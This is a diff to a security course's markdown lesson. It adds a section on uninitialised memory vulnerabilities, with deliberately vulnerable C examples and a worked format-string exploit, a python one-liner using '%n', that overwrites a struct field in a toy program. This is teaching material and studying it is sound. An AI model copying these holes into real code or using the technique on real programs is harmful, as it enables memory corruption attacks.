@@ -1,10 +1,11 @@
-Session 4 - Intro to Vulns
-==========================
+Session 4 - Intro to Vulns Part 1
+=================================
 
 In this session, we will take a broad look at the common classes of
 vulnerabilities present in binary based executables. These include memory
 corruption bugs, unintended use of library functions, and arbitrary precision
-limitations.
+limitations. We will cover Format String Vulnerabilities, Integer Overflows and
+Underflows, and Uninitialised Memory in this session.
 
 Objectives
 ----------
@@ -759,13 +760,217 @@ Hector Marco and Ismael Ripoll that has an integer underflow at it's base. It
 allows an attacker to bypass any Grub authentication by simply pressing the
 backspace key 28 times.
 
-It's a pretty cool discovery check the link to read the details.
+It's a pretty cool discovery so check the link to read the details.
 
 
 3. Memory Corruption Vulnerabilities
 ------------------------------------
 
-Memory corruption vulnerabilities are the bread and butter
+Memory corruption vulnerabilities are the bread and butter of much of systems
+security research. We will classify them in four broad categories:
+
+1. Uninitialised Memory
+2. Illegal Memory Accesses
+3. Overflow-Based
+4. Faulty Memory Management
+
+### Uninitialised Memory
+
+Uninitialised memory vulnerabilities are extremely subtle. When a program uses
+data before it is initialised, unexpected behaviour can occur depending on the
+context. For example, let's take a look at this ([uninit1.c][13]):
+
+```c
+#include <stdio.h>
+
+int main() {
+    eat_burrito();
+    everything_burrito();
+    eat_burrito();
+}
+
+void everything_burrito() {
+    char everything[500];
+    memset(everything, 0x41, 500);
+}
+
+void eat_burrito() {
+    char burrito[500];
+    puts("Never know what you're gonna get!");
+    printf("Yum: %x %x %x %x %x\n", burrito[200], burrito[201], burrito[202],
+            burrito[203], burrito[204]);
+}
+```
+
+In the `eat_burrito()` function, the `burrito` variable is accessed without any
+initialisation done on the string array. It is called two times. Let's see what
+happens when we run it a couple of times:
+
+```console
+$ ./uninit1
+Never know what you're gonna get!
+Yum: 58 8 77 fffffff7 64
+Never know what you're gonna get!
+Yum: 41 41 41 41 41
+$ ./uninit1
+Never know what you're gonna get!
+Yum: 58 ffffffe8 72 fffffff7 44
+Never know what you're gonna get!
+Yum: 41 41 41 41 41
+$ ./uninit1
+Never know what you're gonna get!
+Yum: 58 ffffffa8 76 fffffff7 fffffff4
+Never know what you're gonna get!
+Yum: 41 41 41 41 41
+```
+
+Notice that on the first invocation of `eat_burrito()` for each of the runs, the
+values seem to be rather random. This is due to the ASLR randomising the
+pointers. On the second invocation of `eat_burrito()`, the values are the same
+all the time even though there was no initialisation done on the `burrito`
+variable in the `eat_burrito()` function.
+
+To make this clearer, let's take a look at what happens to the stack before and
+after the `everything_burrito()` function is called.
+
+Before, there is random data in the `burrito` variable.
+
+![uninit1 before][uninit1before]
+
+During the `everything_burrito()` invocation, `memset` is called to set all
+memory addresses to a particular value, in this case `0x41` is chosen.
+
+![uninit1 during][uninit1during]
+
+On the second call to `eat_burrito()`, no data initialisation occurs so the
+values on the stack from the `everything_burrito()` call remains.
+
+![uninit1 after][uninit1after]
+
+#### Is this... exploitable?
+
+Certainly, this gives rise to very subtle bugs but there has been
+vulnerabilities discovered in Internet Explorer 6-8 that allowed attackers to
+execute arbitrary code by [leveraging an uninitialised memory bug][14]. However,
+let us try and imagine a situation where this might appear in an (slightly
+contrived) example ([uninit2.c][15]).
+
+```c
+#include <stdio.h>
+
+struct Adventurer {
+    char name[40];
+    int level;
+};
+
+struct Adventurer finn;
+
+int main() {
+    finn.level = 0;
+    strncpy(finn.name, "Finn", 5);
+    printf("%s is an adventurer! He is level %u!\n", finn.name, finn.level);
+    printf("Finn lives at 0x%x (it's a treehouse.)\n", &finn);
+    puts("He needs training but only Billy *guitar solo* can train him.");
+    printf("Can you tell us where he is? ");
+    billyspad();
+    findbilly();
+    checkfinn();
+}
+
+
+void billyspad() {
+    char everything[500];
+    memset(everything, 0, 500);
+    scanf("%499s", everything);
+}
+
+void findbilly() {
+    char search[500];
+    puts("Thanks! But we couldn't find Billy at: ");
+    printf(search);
+}
+
+void checkfinn() {
+    puts("\nNever mind though! If he is level 101, he will become super" \
+            "mathematical and awesome!");
+    printf("Level: %u\n", finn.level);
+    if (finn.level != 101) {
+        printf("Aww cabbage... %s isn't level 101!\n", finn.name);
+    }
+    else {
+        puts("Woooo, he is totally RAD!");
+    }
+}
+```
+
+There are two vulnerabilities in this snippet of code: an uninitialised memory
+bug and a format string bug. We need to use both of them in conjunction to show
+that Finn is totally rad. First, let's try running it normally:
+
+```console
+$ ./uninit2
+Finn is an adventurer! He is level 0!
+Finn lives at 0x804a060 (it's a treehouse.)
+He needs training but only Billy *guitar solo* can train him.
+Can you tell us where he is? Maybe, the Candy Kingdom?
+Thanks! But we couldn't find Billy at:
+Maybe,
+Never mind though! If he is level 101, he will become supermathematical and awesome!
+Level: 0
+Aww cabbage... Finn isn't level 101!
+```
+
+And verifying that the we can control the format string bug.
+
+```console
+$ ./uninit2
+Finn is an adventurer! He is level 0!
+Finn lives at 0x804a060 (it's a treehouse.)
+He needs training but only Billy *guitar solo* can train him.
+Can you tell us where he is? %x.%x.%x
+Thanks! But we couldn't find Billy at:
+ffd92e68.1f4.f773db18
+Never mind though! If he is level 101, he will become supermathematical and awesome!
+Level: 0
+Aww cabbage... Finn isn't level 101!
+```
+
+Now the bugs occurs in `findbilly()`. The variable `search` is not initialised
+but `printf()` is called with that as a variable. `search` is controllable by
+the attacker because a previous function call filled that area with an input
+prompt. Now, all we have left to do is to overwrite the structure with the
+format string attack.
+
+```console
+$ python -c 'import struct;print struct.pack("I", 0x804a060) + "%97x%6$n"' | ./uninit2
+Finn is an adventurer! He is level 0!
+Finn lives at 0x804a060 (it's a treehouse.)
+He needs training but only Billy *guitar solo* can train him.
+Can you tell us where he is? Thanks! But we couldn't find Billy at:
+`�                                                                                         ffc6c868
+Never mind though! If he is level 101, he will become supermathematical and awesome!
+Level: 0
+Aww cabbage... e isn't level 101!
+```
+
+But wait, the level did not increase. We need to remember something though, we
+are overwriting a structure. The first member of the structure happens to be the
+name of the adventurer and if you look closely, the name of the adventurer
+changed from 'Finn' to 'e'. All we have to do is do a little arithmetic to the
+memory address given to get the right offset and overwrite the level member of
+the structure..
+
+```console
+$ python -c 'import struct;print struct.pack("I", 0x804a060+40) + "%97x%6$n"' | ./uninit2
+Finn is an adventurer! He is level 0!
+Finn lives at 0x804a060 (it's a treehouse.)
+He needs training but only Billy *guitar solo* can train him.
+Can you tell us where he is? Thanks! But we couldn't find Billy at:
+��                                                                                         ff813b48
+Never mind though! If he is level 101, he will become supermathematical and awesome!
+Level: 101
+Woooo, he is totally RAD!
+```
 
 [//]: # (Links)
 [1]: ./formatstring/basic1.c
@@ -780,7 +985,13 @@ Memory corruption vulnerabilities are the bread and butter
 [10]: ./overunder/over3.c
 [11]: ./overunder/gambling4.c
 [12]: http://hmarco.org/bugs/CVE-2015-8370-Grub2-authentication-bypass.html
+[13]: ./uninitialised/uninit1.c
+[14]: http://www.cvedetails.com/cve/CVE-2011-0036/
+[15]: ./uninitialised/uninit2.c
 
 [//]: # (Images)
 [basic2stack]: ./images/basic2stack.png
 [basic3stack]: ./images/basic3stack.png
+[uninit1before]: ./images/uninit1-firsteat.png
+[uninit1during]: ./images/uninit1-everything.png
+[uninit1after]: ./images/uninit1-secondeat.png
